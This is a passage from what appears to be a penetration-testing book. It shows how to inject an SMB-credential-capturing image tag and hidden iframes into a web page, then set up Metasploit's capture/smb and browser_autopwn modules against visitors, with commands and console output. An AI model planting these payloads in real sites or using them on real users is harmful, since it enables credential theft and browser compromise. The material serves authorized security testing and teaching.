<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf11e" class="pf w2 h2" data-page-no="11e"><div class="pc pc11e w2 h2"><div class="t m0 xa3 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 7: Phase III: Remote T<span class="_ _0"/>argeting<span class="_ _9"> </span><span class="ff1 fs9 lsa">263</span></div><div class="t m0 x4 hd y11c ff4 fs7 fc0 sc0 ls0 ws0">Next, the inject.php le includes an image tag that references a UNC path, as in </div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls0 ws0">the follo<span class="_ _0"/>wing example. It’<span class="_ _2"/>s becoming rarer for this to work, but if the user’<span class="_ _2"/>s bro<span class="_ _0"/>wser </div><div class="t m0 x3 hd y11e ff4 fs7 fc0 sc0 ls0 ws0">is miscongured, they might attempt to authenticate automatically via Serv<span class="_ _0"/>er </div><div class="t m0 x3 hd y15c ff4 fs7 fc0 sc0 ls0 ws0">Message Block (SMB) to our system.</div><div class="t m0 x3 h44 y1001 fff fse fc0 sc0 ls0 ws0">echo "&lt;img src=\"\\\\10.0.0.1\share\image.jpg\"&gt;";</div><div class="t m0 x4 hd y1b82 ff4 fs7 fc0 sc0 ls0 ws0">T<span class="_ _3"/>o capture the SMB credentials, we’ll use the Metasploit capture/SMB auxiliary </div><div class="t m0 x3 hd y1b83 ff4 fs7 fc0 sc0 ls0 ws0">module. In the follo<span class="_ _0"/>wing example, we need to simply set one option for the </div><div class="t m0 x3 hd y1b84 ff4 fs7 fc0 sc0 ls0 ws0">JOHNPWFILE. This will log all of the hashes obtained to the le specied in a </div><div class="t m0 x3 hd y1b85 ff4 fs7 fc0 sc0 ls0 ws0">format acceptable to the John the Ripper password cracker<span class="_ _2"/>.</div><div class="t m0 x3 h44 y1b86 fff fse fc0 sc0 ls0 ws0">msf &gt; use auxiliary/server/capture/smb</div><div class="t m0 x3 h44 y1b87 fff fse fc0 sc0 ls0 ws0">msf auxiliary(smb) &gt; set JOHNPWFILE /root/john.txt</div><div class="t m0 x3 h44 y1b88 fff fse fc0 sc0 ls0 ws0">msf auxiliary(smb) &gt; exploit</div><div class="t m0 x3 h44 y195b fff fse fc0 sc0 ls0 ws0">[*] Auxiliary module execution completed</div><div class="t m0 x3 h44 y1b89 fff fse fc0 sc0 ls0 ws0">[*] Server started.</div><div class="t m0 x3 h44 y1b8a fff fse fc0 sc0 ls0 ws0">msf auxiliary(smb) &gt; </div><div class="t m0 x4 hd y1b8b ff4 fs7 fc0 sc0 ls0 ws0">Finally<span class="_ _2"/>, we’ll inject an iframe for the bro<span class="_ _0"/>wser autopwn and Jav<span class="_ _0"/>a-signed applet </div><div class="t m0 x3 hd y1b8c ff4 fs7 fc0 sc0 ls0 ws0">URIs from Metasploit. In the example from the inject le, you’<span class="_ _0"/>ll see that we set up </div><div class="t m0 x3 hd y1b8d ff4 fs7 fc0 sc0 ls0 ws0">each one on its o<span class="_ _0"/>wn port, in this case, 81 and 82. I like to increment the port number </div><div class="t m0 x3 hd y1b8e ff4 fs7 fc0 sc0 ls0 ws0">to make it clearer the order in which each of these should be accessed.</div><div class="t m0 x4 hd y1b8f ff4 fs7 fc0 sc0 ls0 ws0">In the pre<span class="_ _0"/>vious example, you sa<span class="_ _0"/>w the following iframes:</div><div class="t m0 x3 h40 y1b90 fff fs5 fc0 sc0 ls0 ws0">echo "&lt;iframe src='http://10.0.0.1:81/bap' width='0' height='0' tabindex='-1' </div><div class="t m0 x3 h40 y1b91 fff fs5 fc0 sc0 ls0 ws0">title='empty'&gt;&lt;/iframe&gt;";</div><div class="t m0 x3 h40 y1b92 fff fs5 fc0 sc0 ls0 ws0">echo "&lt;iframe src='http://10.0.0.1:82/java' width='0' height='0' tabindex='-1' </div><div class="t m0 x3 h40 y1b93 fff fs5 fc0 sc0 ls0 ws0">title='empty'&gt;&lt;/iframe&gt;";</div><div class="t m0 x4 hd y1b94 ff4 fs7 fc0 sc0 ls0 ws0">T<span class="_ _3"/>o congure the browser_autopwn, use: </div><div class="t m0 x3 h44 y1b95 fff fse fc0 sc0 ls0 ws0">msf &gt; use auxiliary/server/browser_autopwn </div><div class="t m0 x3 h44 y1b96 fff fse fc0 sc0 ls0 ws0">msf auxiliary(browser_autopwn) &gt; set SRVPORT 81</div><div class="t m0 x3 h44 y1b97 fff fse fc0 sc0 ls0 ws0">SRVPORT =&gt; 81</div><div class="t m0 x3 h44 y1b98 fff fse fc0 sc0 ls0 ws0">msf auxiliary(browser_autopwn) &gt; set LHOST 10.0.0.1</div><div class="t m0 x3 h44 y1b99 fff fse fc0 sc0 ls0 ws0">LHOST =&gt; 10.0.0.1</div><div class="t m0 x3 h44 y1b9a fff fse fc0 sc0 ls0 ws0">msf auxiliary(browser_autopwn) &gt; set URIPATH /bap</div><div class="t m0 x3 h44 y1b9b fff fse fc0 sc0 ls0 ws0">URIPATH =&gt; /bap </div><div class="t m0 x3 h44 y1b9c fff fse fc0 sc0 ls0 ws0">msf auxiliary(browser_autopwn) &gt; exploit</div><div class="t m0 x3 h44 y1b9d fff fse fc0 sc0 ls0 ws0">[*] Auxiliary module execution completed</div><div class="t m0 x3 h44 y1b9e fff fse fc0 sc0 ls0 ws0">[*] Setup</div><div class="t m0 x3 h44 y1b9f fff fse fc0 sc0 ls0 ws0">[*] Obfuscating initial javascript 2014-03-09 15:34:57 -0400</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>